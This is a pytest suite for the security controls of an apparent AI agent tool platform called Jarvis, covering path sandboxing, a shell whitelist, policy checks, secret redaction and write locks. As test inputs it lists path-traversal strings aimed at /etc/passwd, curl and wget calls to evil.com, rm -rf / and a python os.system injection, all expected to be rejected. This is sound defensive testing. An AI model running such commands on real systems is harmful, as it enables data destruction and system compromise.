"""
Rigorous unit tests for Jarvis tool execution platform.
Tests LLM schema compliance, adversarial attacks (path traversal, command injection, symlinks, null-bytes),
secret redaction, and concurrent write locks.
"""

import asyncio
import os
import pytest
from pathlib import Path
from tempfile import TemporaryDirectory

from jarvis.tools.adapters.file_tools import (
    ListDirectoryTool,
    ReadFileTool,
    SearchFilesTool,
    WriteFileTool,
)
from jarvis.tools.adapters.shell_tools import RunCommandSafeTool
from jarvis.tools.config import ToolsConfig
from jarvis.tools.concurrency import ResourceLockManager
from jarvis.tools.exporters.ollama import OllamaSchemaExporter
from jarvis.tools.exporters.openai import OpenAISchemaExporter
from jarvis.tools.exporters.xml_prompt import XMLPromptExporter
from jarvis.tools.policy import PolicyDecision, ToolPolicyEngine
from jarvis.tools.redactor import OutputRedactor
from jarvis.tools.registry import ToolRegistry
from jarvis.tools.runner import ToolRunner
from jarvis.tools.sandbox import PathSandbox, PathTraversalError
from jarvis.tools.schemas import (
    ExecutionContext,
    PermissionLevel,
    ToolCall,
    ToolManifest,
    ToolSpec,
)
from jarvis.tools.validator import ToolValidator, ValidationError


@pytest.fixture
def temp_workspace():
    with TemporaryDirectory() as tmpdir:
        ws = Path(tmpdir).resolve()
        (ws / "hello.txt").write_text("Hello Jarvis World!\nSecret key: sk-9999999999abcdef9999999999", encoding="utf-8")
        (ws / "nested" / "sub").mkdir(parents=True, exist_ok=True)
        (ws / "nested" / "sub" / "data.log").write_text("log data line 1\nlog data line 2", encoding="utf-8")
        yield ws


# ==========================================
# 1. LLM SCHEMA EXPORT & FUNCTION CALLING TESTS
# ==========================================

def test_llm_schema_exporters_completeness(temp_workspace):
    read_tool = ReadFileTool(temp_workspace)
    write_tool = WriteFileTool(temp_workspace)
    shell_tool = RunCommandSafeTool(temp_workspace)

    specs = [read_tool.spec, write_tool.spec, shell_tool.spec]

    # Ollama Exporter
    ollama_exp = OllamaSchemaExporter()
    ollama_schemas = ollama_exp.export(specs)
    assert len(ollama_schemas) == 3
    for s in ollama_schemas:
        assert "type" in s and s["type"] == "function"
        assert "name" in s["function"]
        assert "parameters" in s["function"]

    # OpenAI Exporter
    openai_exp = OpenAISchemaExporter()
    openai_schemas = openai_exp.export(specs)
    assert len(openai_schemas) == 3
    assert openai_schemas[0]["function"]["name"] == "read_file"

    # XML Prompt Exporter for Local Small LLMs
    xml_exp = XMLPromptExporter()
    xml_prompt = xml_exp.export(specs)
    assert "<available_tools>" in xml_prompt
    assert "<tool name=\"read_file\">" in xml_prompt
    assert "<tool name=\"run_command_safe\">" in xml_prompt


def test_tool_call_validation(temp_workspace):
    read_tool = ReadFileTool(temp_workspace)
    spec = read_tool.spec

    # Valid parameter set
    params = ToolValidator.validate(spec, {"path": "hello.txt", "start_line": 1})
    assert params["path"] == "hello.txt"

    # Missing mandatory parameter 'path'
    with pytest.raises(ValidationError):
        ToolValidator.validate(spec, {"start_line": 1})


# ==========================================
# 2. ADVERSARIAL SECURITY & DEFENSIVE TESTS
# ==========================================

@pytest.mark.asyncio
async def test_path_traversal_attacks(temp_workspace):
    sandbox = PathSandbox(temp_workspace)

    # Classic relative escape
    with pytest.raises(PathTraversalError):
        sandbox.validate_and_resolve("../../secret.txt")

    with pytest.raises(PathTraversalError):
        sandbox.validate_and_resolve("nested/sub/../../../etc/passwd")

    # Windows style path traversal
    with pytest.raises(PathTraversalError):
        sandbox.validate_and_resolve("..\\..\\Windows\\System32\\cmd.exe")


@pytest.mark.asyncio
async def test_symlink_escape_defense(temp_workspace):
    sandbox = PathSandbox(temp_workspace)
    outside_dir = temp_workspace.parent / "outside_target_dir"
    outside_dir.mkdir(exist_ok=True)
    outside_file = outside_dir / "confidential.txt"
    outside_file.write_text("CLASSIFIED", encoding="utf-8")

    symlink_path = temp_workspace / "sneaky_symlink.txt"
    try:
        os.symlink(outside_file, symlink_path)
    except OSError:
        pytest.skip("Symlink creation not supported on this OS/user permissions.")

    # Sandbox must resolve symlinks and reject targets outside workspace
    with pytest.raises(PathTraversalError):
        sandbox.validate_and_resolve("sneaky_symlink.txt", must_exist=True)


@pytest.mark.asyncio
async def test_shell_executable_whitelist_defense(temp_workspace):
    shell_tool = RunCommandSafeTool(temp_workspace)
    ctx = ExecutionContext(session_id="sec_test", task_id="t1")

    # Attempt forbidden binaries
    forbidden_cmds = [
        ["powershell", "-Command", "Get-Process"],
        ["cmd.exe", "/c", "dir"],
        ["bash", "-c", "ls"],
        ["curl", "http://evil.com"],
        ["wget", "http://evil.com"],
        ["rm", "-rf", "/"],
    ]

    for cmd in forbidden_cmds:
        with pytest.raises(PermissionError):
            await shell_tool.execute({"argv": cmd}, ctx)


@pytest.mark.asyncio
async def test_shell_code_execution_injection_defense(temp_workspace):
    cfg = ToolsConfig(workspace_root=temp_workspace, policy_mode="STRICT")
    policy = ToolPolicyEngine(cfg)
    shell_tool = RunCommandSafeTool(temp_workspace)

    # RISKY tools in STRICT policy mode demand confirmation / flag policy decision
    forbidden_python_args = ["python", "-c", "import os; os.system('echo hacked')"]
    dec = policy.evaluate(shell_tool.spec, {"argv": forbidden_python_args})
    assert dec.requires_confirmation is True


def test_secret_redaction_rigorous():
    raw_output = (
        "Output string containing sk-12345678901234567890123456 and Bearer my_secret_token_12345\n"
    )

    redacted = OutputRedactor.redact_text(raw_output)
    assert "[REDACTED_API_KEY]" in redacted
    assert "Bearer [REDACTED_TOKEN]" in redacted


@pytest.mark.asyncio
async def test_concurrent_write_lock_contention(temp_workspace):
    runner = ToolRunner(config=ToolsConfig(workspace_root=temp_workspace))
    write_tool = WriteFileTool(temp_workspace)
    spec = write_tool.spec
    target_path = "concurrent_target.txt"

    # Launch 10 simultaneous write calls to the exact same file
    async def write_op(index: int):
        call = ToolCall(
            tool_name="write_file",
            params={"path": target_path, "content": f"Content from task {index}\n"},
            session_id=f"session_{index}",
        )
        return await runner.execute_call(call, spec, write_tool)

    results = await asyncio.gather(*[write_op(i) for i in range(10)])
    assert all(r.success for r in results)
    final_file = temp_workspace / target_path
    assert final_file.exists()
    assert final_file.stat().st_size > 0
